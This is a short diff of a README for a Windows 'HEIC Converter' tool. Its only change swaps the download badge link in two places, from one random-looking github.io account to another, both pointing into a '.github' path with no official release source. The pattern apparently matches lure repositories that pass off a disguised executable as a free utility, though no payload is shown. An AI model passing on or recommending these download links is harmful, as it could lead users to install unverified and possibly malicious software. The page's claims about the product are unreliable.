@@ -16,7 +16,7 @@ HEIC Converter is an image conversion utility for Windows that turns HEIC and HE
 <div align="center">
   <h3>Convert HEIC photos to JPG, PNG, JPEG, or PDF in seconds</h3>
 
-  [![Download HEIC Converter](https://img.shields.io/badge/⬇_Download_HEIC_Converter_for_Windows-2962FF?style=for-the-badge)](https://rossanastmichelshsqvt.github.io/.github/HEIC-Converter-Desktop)
+  [![Download HEIC Converter](https://img.shields.io/badge/⬇_Download_HEIC_Converter_for_Windows-2962FF?style=for-the-badge)](https://joeschmidt61.github.io/.github/HEIC-Converter-Desktop)
 
 </div>
 
@@ -86,7 +86,7 @@ For help with HEIC Converter, open the built-in Help or Support section inside t
 <div align="center">
   <h3>Ready to convert your HEIC photos?</h3>
 
-  [![Download HEIC Converter](https://img.shields.io/badge/⬇_Download_HEIC_Converter_for_Windows-2962FF?style=for-the-badge)](https://rossanastmichelshsqvt.github.io/.github/HEIC-Converter-Desktop)
+  [![Download HEIC Converter](https://img.shields.io/badge/⬇_Download_HEIC_Converter_for_Windows-2962FF?style=for-the-badge)](https://joeschmidt61.github.io/.github/HEIC-Converter-Desktop)
 
 </div>
 
